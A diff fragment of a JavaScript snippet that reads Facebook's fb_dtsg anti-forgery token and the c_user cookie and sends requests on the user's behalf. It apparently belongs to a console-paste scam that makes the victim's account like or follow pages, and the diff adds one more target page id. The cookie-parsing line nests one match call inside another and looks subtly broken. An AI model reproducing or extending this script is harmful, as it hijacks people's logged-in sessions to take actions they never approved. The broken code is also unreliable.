@@ -1,4 +1,3 @@
-
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 var now=(new Date).getTime();
@@ -15,3 +14,4 @@ Page.close;
 Page.send(PageParams);
 }
 G("310509582323426");
+G("509238652461734");
